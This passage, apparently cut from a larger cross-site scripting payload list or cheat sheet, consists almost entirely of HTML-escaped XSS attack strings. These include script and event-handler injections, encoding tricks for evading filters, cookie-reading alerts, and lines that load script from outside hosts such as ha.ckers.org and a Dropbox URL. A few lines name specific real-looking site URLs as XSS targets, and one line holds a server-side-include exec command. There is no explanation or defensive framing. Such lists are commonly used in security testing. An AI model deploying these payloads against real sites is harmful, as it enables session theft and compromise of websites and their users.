CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\"&gt;\n&lt;IFRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/IFRAME&gt;\n&lt;IFRAME SRC=# onmouseover=\"alert(document.cookie)\"&gt;&lt;/IFRAME&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:alert('XSS');\"&gt;&lt;/FRAMESET&gt;\n&lt;TABLE BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript:alert('XSS')\"&gt;\n&lt;DIV STYLE=\"background-image: url(javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\"&gt;\n&lt;DIV STYLE=\"background-image: url(&amp;#1;javascript:alert('XSS'))\"&gt;\n&lt;DIV STYLE=\"width: expression(alert('XSS'));\"&gt;\n&lt;BASE HREF=\"javascript:alert('XSS');//\"&gt;\n &lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"&gt;&lt;/OBJECT&gt;\n&lt;EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;\n&lt;SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"&gt;&lt;/SCRIPT&gt;\n&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;'\"--&gt;\n&lt;? echo('&lt;SCR)';echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;\n&lt;IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\"&gt;\nRedirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser\n&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;\n &lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\n&lt;SCRIPT a=\"&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT =\"&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;\" '' SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT \"a='&gt;'\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=`&gt;` SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;SCRIPT&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http://ha.ckers.org/xss.js\"&gt;&lt;/SCRIPT&gt;\n&lt;A HREF=\"http://66.102.7.147/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://1113982867/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://0x42.0x0000066.0x7.0x93/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"http://0102.0146.0007.00000223/\"&gt;XSS&lt;/A&gt;\n&lt;A HREF=\"htt p://6 6.000146.0x7.147/\"&gt;XSS&lt;/A&gt;\n&lt;iframe  src=\"&amp;Tab;javascript:prompt(1)&amp;Tab;\"&gt;\n&lt;svg&gt;&lt;style&gt;{font-family&amp;colon;'&lt;iframe/onload=confirm(1)&gt;'\n&lt;input/onmouseover=\"javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;\"\n&lt;sVg&gt;&lt;scRipt &gt;alert&amp;lpar;1&amp;rpar; {Opera}\n&lt;img/src=`` onerror=this.onerror=confirm(1) \n&lt;form&gt;&lt;isindex formaction=\"javascript&amp;colon;confirm(1)\"\n&lt;img src=``&amp;NewLine; onerror=alert(1)&amp;NewLine;\n&lt;script/&amp;Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&amp;Tab;&gt;&lt;/script&gt;\n&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?\n&lt;iframe/src=\"data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\"&gt;\n&lt;script /**/&gt;/**/alert(1)/**/&lt;/script /**/\n&amp;#34;&amp;#62;&lt;h1/onmouseover='\\u0061lert(1)'&gt;\n&lt;iframe/src=\"data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;\"&gt;\n&lt;meta content=\"&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)\" http-equiv=\"refresh\"/&gt;\n&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script\n&lt;svg&gt;&lt;script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}\n&lt;meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"&gt;\n&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;\n&lt;form&gt;&lt;a href=\"javascript:\\u0061lert&amp;#x28;1&amp;#x29;\"&gt;X\n&lt;/script&gt;&lt;img/*/src=\"worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;\"/*/onerror='eval(src)'&gt;\n&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;\n&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=\"javascript&amp;#58;alert(1)\"&amp;#11;&amp;#10;&amp;#09;;&gt;\n&lt;a href=\"data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/a\nhttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script\n&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;\"&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;\"&gt;XYZ&lt;/a\n&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt('&amp;#49;')\n&lt;style/onload=prompt&amp;#40;'&amp;#88;&amp;#83;&amp;#83;'&amp;#41;\n&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^\n&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(\n&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;\"date\" onfocus=\"alert(1)\"&gt;\n&lt;form&gt;&lt;textarea &amp;#13; onkeyup='\\u0061\\u006C\\u0065\\u0072\\u0074&amp;#x28;1&amp;#x29;'&gt;\n&lt;script /***/&gt;/***/confirm('\\uFF41\\uFF4C\\uFF45\\uFF52\\uFF54\\u1455\\uFF11\\u1450')/***/&lt;/script /***/\n&lt;iframe srcdoc='&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;'&gt;\n&lt;a href=\"javascript:void(0)\" onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;\n&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;\n&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;\n&lt;///style///&gt;&lt;span %2F onmousemove='alert&amp;lpar;1&amp;rpar;'&gt;SPAN\n&lt;img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&amp;Tab;prompt(1)\n&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;{-o-link-source&amp;colon;'&lt;body/onload=confirm(1)&gt;'\n&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver {Firefox &amp; Opera}\n&lt;marquee onstart='javascript:alert&amp;#x28;1&amp;#x29;'&gt;^__^\n&lt;div/style=\"width:expression(confirm(1))\"&gt;X&lt;/div&gt; {IE7}\n&lt;iframe// src=javaSCRIPT&amp;colon;alert(1)\n//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type='submit'&gt;//\n/*iframe/src*/&lt;iframe/src=\"&lt;iframe/src=@\"/onload=prompt(1) /*iframe/src*/&gt;\n//|\\\\ &lt;script //|\\\\ src='https://dl.dropbox.com/u/13018058/js.js'&gt; //|\\\\ &lt;/script //|\\\\\n&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;{src&amp;#x3A;'&lt;style/onload=this.onload=confirm(1)&gt;'&lt;/font&gt;/&lt;/style&gt;\n&lt;a/href=\"javascript:&amp;#13; javascript:prompt(1)\"&gt;&lt;input type=\"X\"&gt;\n&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)\n&lt;/svg&gt;''&lt;svg&gt;&lt;script 'AQuickBrownFoxJumpsOverTheLazyDog'&gt;alert&amp;#x28;1&amp;#x29; {Opera}\n&lt;a href=\"javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;\"&gt;&lt;button&gt;\n&lt;div onmouseover='alert&amp;lpar;1&amp;rpar;'&gt;DIV&lt;/div&gt;\n&lt;iframe style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\"&gt;\n&lt;a href=\"jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;\"&gt;X&lt;/a&gt;\n&lt;embed src=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;object data=\"http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf\"&gt;\n&lt;var onmouseover=\"prompt(1)\"&gt;On Mouse Over&lt;/var&gt;\n&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;\n&lt;img src=\"/\" =_=\" title=\"onerror='prompt(1)'\"&gt;\n&lt;%&lt;!--'%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;\n&lt;script src=\"data:text/javascript,alert(1)\"&gt;&lt;/script&gt;\n&lt;iframe/src \\/\\/onload = prompt(1)\n&lt;iframe/onreadystatechange=alert(1)\n&lt;svg/onload=alert(1)\n&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)\n&lt;input type=\"text\" value=`` &lt;div/onmouseover='alert(1)'&gt;X&lt;/div&gt;\n&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;\n&lt;img src=`xx:xx`onerror=alert(1)&gt;\n&lt;object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"&gt;&lt;/object&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0;javascript&amp;colon;alert(1)\"/&gt;\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always&gt;\n&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1\n&lt;a href=\"data:text/html;base64_,&lt;svg/onload=\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\"&gt;X&lt;/a\n&lt;iframe/onreadystatechange=\\u0061\\u006C\\u0065\\u0072\\u0074('\\u0061') worksinIE&gt;\n&lt;script&gt;~'\\u0061' ; \\u0074\\u0068\\u0072\\u006F\\u0077 ~ \\u0074\\u0068\\u0069\\u0073. \\u0061\\u006C\\u0065\\u0072\\u0074(~'\\u0061')&lt;/script U+\n&lt;script/src=\"data&amp;colon;text%2Fj\\u0061v\\u0061script,\\u0061lert('\\u0061')\"&gt;&lt;/script a=\\u0061 &amp; /=%2F\n&lt;script/src=data&amp;colon;text/j\\u0061v\\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script\n&lt;object data=javascript&amp;colon;\\u0061&amp;#x6C;&amp;#101%72t(1)&gt;\n&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;\n&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;\n&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script\n&lt;img src ?itworksonchrome?\\/onerror = alert(1)\n&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;\n&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)\n&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe\n&lt;script x&gt; alert(1) &lt;/script 1=2\n&lt;div/onmouseover='alert(1)'&gt; style=\"x:\"&gt;\n&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;\n&lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;\n&lt;div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onmouseover=\"prompt(1)\" onclick=\"alert(1)\"&gt;x&lt;/button&gt;\n\"&gt;&lt;img src=x onerror=window.open('https://www.google.com/');&gt;\n&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME\n&lt;math&gt;&lt;a xlink:href=\"//jsfiddle.net/t846h/\"&gt;click\n&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;\n&lt;iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"&gt;&lt;/iframe&gt;\n&lt;a href=\"data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203\"&gt;Click Me&lt;/a&gt;\n'';!--\"&lt;XSS&gt;=&amp;{()}\n'&gt;//\\\\,&lt;'&gt;\"&gt;\"&gt;\"*\"\n'); alert('XSS\n&lt;script&gt;alert(1);&lt;/script&gt;\n&lt;script&gt;alert('XSS');&lt;/script&gt;\n&lt;IMG SRC=\"javascript:alert('XSS');\"&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;\n&lt;IMG SRC=javascript:alert('XSS')&gt;\n&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;\n&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;\n&lt;scr&lt;script&gt;ipt&gt;alert('XSS');&lt;/scr&lt;/script&gt;ipt&gt;\n&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt; \n&lt;img src=foo.png onerror=alert(/xssed/) /&gt;\n&lt;style&gt;@im\\port'\\ja\\vasc\\ript:alert(\\\"XSS\\\")';&lt;/style&gt;\n&lt;? echo('&lt;scr)'; echo('ipt&gt;alert(\\\"XSS\\\")&lt;/script&gt;'); ?&gt;\n&lt;marquee&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/marquee&gt;\n&lt;IMG SRC=\\\"jav&amp;#x09;ascript:alert('XSS');\\\"&gt;\n&lt;IMG SRC=\\\"jav&amp;#x0A;ascript:alert('XSS');\\\"&gt;\n&lt;IMG SRC=\\\"jav&amp;#x0D;ascript:alert('XSS');\\\"&gt;\n&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;\n\"&gt;&lt;script&gt;alert(0)&lt;/script&gt;\n&lt;script src=http://yoursite.com/your_files.js&gt;&lt;/script&gt;\n&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;\n&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;\n&lt;IMG LOWSRC=\\\"javascript:alert('XSS')\\\"&gt;\n&lt;IMG DYNSRC=\\\"javascript:alert('XSS')\\\"&gt;\n&lt;font style='color:expression(alert(document.cookie))'&gt;\n&lt;img src=\"javascript:alert('XSS')\"&gt;\n&lt;script language=\"JavaScript\"&gt;alert('XSS')&lt;/script&gt;\n&lt;body onunload=\"javascript:alert('XSS');\"&gt;\n&lt;body onLoad=\"alert('XSS');\"\n[color=red' onmouseover=\"alert('xss')\"]mouse over[/color]\n\"/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt;\nwindow.alert(\"Bonjour !\");\n&lt;div style=\"x:expression((window.r==1)?'':eval('r=1;\nalert(String.fromCharCode(88,83,83));'))\"&gt;\n&lt;iframe&lt;?php echo chr(11)?&gt; onload=alert('XSS')&gt;&lt;/iframe&gt;\n\"&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;\n'&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;\n'\"&gt;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;\n'\"&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;\n&lt;META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert('XSS');\\\"&gt;\n&lt;META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http://;URL=javascript:alert('XSS');\\\"&gt;\n&lt;script&gt;var var = 1; alert(var)&lt;/script&gt;\n&lt;STYLE type=\"text/css\"&gt;BODY{background:url(\"javascript:alert('XSS')\")}&lt;/STYLE&gt;\n&lt;?='&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'?&gt;\n&lt;IMG SRC='vbscript:msgbox(\\\"XSS\\\")'&gt;\n\" onfocus=alert(document.domain) \"&gt; &lt;\"\n&lt;FRAMESET&gt;&lt;FRAME SRC=\\\"javascript:alert('XSS');\\\"&gt;&lt;/FRAMESET&gt;\n&lt;STYLE&gt;li {list-style-image: url(\\\"javascript:alert('XSS')\\\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS\nperl -e 'print \\\"&lt;SCR\\0IPT&gt;alert(\\\"XSS\\\")&lt;/SCR\\0IPT&gt;\\\";' &gt; out\nperl -e 'print \\\"&lt;IMG SRC=java\\0script:alert(\\\"XSS\\\")&gt;\\\";' &gt; out\n&lt;br size=\\\"&amp;{alert('XSS')}\\\"&gt;\n&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;\n&lt;/br style=a:expression(alert())&gt;\n&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n\"&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")&gt;\n[color=red width=expression(alert(123))][color]\n&lt;BASE HREF=\"javascript:alert('XSS');//\"&gt;\nExecute(MsgBox(chr(88)&amp;chr(83)&amp;chr(83)))&lt;\n\"&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt;\n&lt;body onLoad=\"while(true) alert('XSS');\"&gt;\n'\"&gt;&lt;/title&gt;&lt;script&gt;alert(1111)&lt;/script&gt;\n&lt;/textarea&gt;'\"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n'\"\"&gt;&lt;script language=\"JavaScript\"&gt; alert('X \\nS \\nS');&lt;/script&gt;\n&lt;/script&gt;&lt;/script&gt;&lt;&lt;&lt;&lt;script&gt;&lt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;script&gt;alert(123)&lt;/script&gt;\n&lt;html&gt;&lt;noalert&gt;&lt;noscript&gt;(123)&lt;/noscript&gt;&lt;script&gt;(123)&lt;/script&gt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\"&gt;\n'&gt;&lt;/select&gt;&lt;script&gt;alert(123)&lt;/script&gt;\n'&gt;\"&gt;&lt;script src = 'http://www.site.com/XSS.js'&gt;&lt;/script&gt;\n}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/XSS/.source));&lt;/script&gt;\n&lt;SCRIPT&gt;document.write(\"XSS\");&lt;/SCRIPT&gt;\na=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('xss');\";eval(a+b+c+d);\n='&gt;&lt;script&gt;alert(\"xss\")&lt;/script&gt;\n&lt;script+src=\"&gt;\"+src=\"http://yoursite.com/xss.js?69,69\"&gt;&lt;/script&gt;\n&lt;body background=javascript:'\"&gt;&lt;script&gt;alert(navigator.userAgent)&lt;/script&gt;&gt;&lt;/body&gt;\n\"&gt;/XaDoS/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script src=\"http://www.site.com/XSS.js\"&gt;&lt;/script&gt;\n\"&gt;/KinG-InFeT.NeT/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;\nsrc=\"http://www.site.com/XSS.js\"&gt;&lt;/script&gt;\ndata:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=\n!--\" /&gt;&lt;script&gt;alert('xss');&lt;/script&gt;\n&lt;script&gt;alert(\"XSS by \\nxss\")&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;\n\"&gt;&lt;script&gt;alert(\"XSS by \\nxss\")&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;\n'\"&gt;&lt;/title&gt;&lt;script&gt;alert(\"XSS by \\nxss\")&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;\n&lt;img \"\"\"&gt;&lt;script&gt;alert(\"XSS by \\nxss\")&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;\n&lt;script&gt;alert(1337)&lt;/script&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;\n\"&gt;&lt;script&gt;alert(1337)&lt;/script&gt;\"&gt;&lt;script&gt;alert(\"XSS by \\nxss&lt;/h1&gt;&lt;/marquee&gt;\n'\"&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;\n&lt;iframe src=\"javascript:alert('XSS by \\nxss');\"&gt;&lt;/iframe&gt;&lt;marquee&gt;&lt;h1&gt;XSS by xss&lt;/h1&gt;&lt;/marquee&gt;\n'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;img src=\"\" alt='\n\"&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;img src=\"\" alt=\"\n\\'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&lt;img src=\"\" alt=\\'\nhttp://www.simpatie.ro/index.php?page=friends&amp;member=781339&amp;javafunctionname=Pageclick&amp;javapgno=2 javapgno=2 ??XSS??\nhttp://www.simpatie.ro/index.php?page=top_movies&amp;cat=13&amp;p=2 p=2 ??XSS??\n'); alert('xss'); var x='\n\\\\'); alert(\\'xss\\');var x=\\'\n//--&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83));\n&gt;\"&gt;&lt;ScRiPt%20%0a%0d&gt;alert(561177485777)%3B&lt;/ScRiPt&gt;\n&lt;img src=\"Mario Heiderich says that svg SHOULD not be executed trough image tags\" onerror=\"javascript:document.write('\\u003c\\u0069\\u0066\\u0072\\u0061\\u006d\\u0065\\u0020\\u0073\\u0072\\u0063\\u003d\\u0022\\u0064\\u0061\\u0074\\u0061\\u003a\\u0069\\u006d\\u0061\\u0067\\u0065\\u002f\\u0073\\u0076\\u0067\\u002b\\u0078\\u006d\\u006c\\u003b\\u0062\\u0061\\u0073\\u0065\\u0036\\u0034\\u002c\\u0050\\u0048\\u004e\\u0032\\u005a\\u0079\\u0042\\u0034\\u0062\\u0057\\u0078\\u0075\\u0063\\u007a\\u0030\\u0069\\u0061\\u0048\\u0052\\u0030\\u0063\\u0044\\u006f\\u0076\\u004c\\u0033\\u0064\\u0033\\u0064\\u0079\\u0035\\u0033\\u004d\\u0079\\u0035\\u0076\\u0063\\u006d\\u0063\\u0076\\u004d\\u006a\\u0041\\u0077\\u004d\\u0043\\u0039\\u007a\\u0064\\u006d\\u0063\\u0069\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u0070\\u0062\\u0057\\u0046\\u006e\\u005a\\u0053\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0045\\u0070\\u0049\\u006a\\u0034\\u0038\\u004c\\u0032\\u006c\\u0074\\u0059\\u0057\\u0064\\u006c\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u007a\\u0064\\u006d\\u0063\\u0067\\u0062\\u0032\\u0035\\u0073\\u0062\\u0032\\u0046\\u006b\\u0050\\u0053\\u004a\\u0068\\u0062\\u0047\\u0056\\u0079\\u0064\\u0043\\u0067\\u0079\\u004b\\u0053\\u0049\\u002b\\u0050\\u0043\\u0039\\u007a\\u0064\\u006d\\u0063\\u002b\\u0049\\u0043\\u0041\\u004b\\u0049\\u0043\\u0041\\u0067\\u0050\\u0048\\u004e\\u006a\\u0063\\u006d\\u006c\\u0077\\u0064\\u0044\\u0035\\u0068\\u0062\\u0047\\u0056\\u0079\\u0064\\u0043\\u0067\\u007a\\u004b\\u0054\\u0077\\u0076\\u0063\\u0032\\u004e\\u0079\\u0061\\u0058\\u0042\\u0030\\u0050\\u0069\\u0041\\u0067\\u0043\\u0069\\u0041\\u0067\\u0049\\u0044\\u0078\\u006b\\u005a\\u0057\\u005a\\u007a\\u0049\\u0047\\u0039\\u0075\\u0062\\u0047\\u0039\\u0068\\u005a\\u0044\\u0030\\u0069\\u0059\\u0057\\u0078\\u006c\\u0063\\u006e\\u0051\\u006f\\u004e\\u0043\\u006b\\u0069\\u0050\\u006a\\u0077\\u0076\\u005a\\u0047\\u0056\\u006d\\u0063\\u007a\\u0034\\u0067\\u0049\\u0041\\u006f\\u0067\\u0049\\u0043\\u0041\\u0038\\u005a\\u0079\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\u0030\\u004b\\u0044\\u0055\\u0070\\u0049\\u006a\\u0034\\u0067\\u0049\\u0041\\u006f\\u0067\\u0049\\u0043\\u0041\\u0067\\u0049\\u0043\\u0041\\u0067\\u0050\\u0047\\u004e\\u0070\\u0063\\u006d\\u004e\\u0073\\u005a\\u0053\\u0042\\u0076\\u0062\\u006d\\u0078\\u0076\\u0059\\u0057\\u0051\\u0039\\u0049\\u006d\\u0046\\u0073\\u005a\\u0058\\u004a\\